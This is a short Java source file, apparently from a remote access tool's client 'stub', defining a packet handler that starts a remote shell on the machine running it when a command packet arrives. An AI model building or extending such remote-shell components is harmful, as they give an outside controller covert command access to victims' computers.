package com.redpois0n.stub.packets.incoming;

import com.redpois0n.RemoteShell;

public class Packet38RunCommand extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new RemoteShell().start();
	}

}
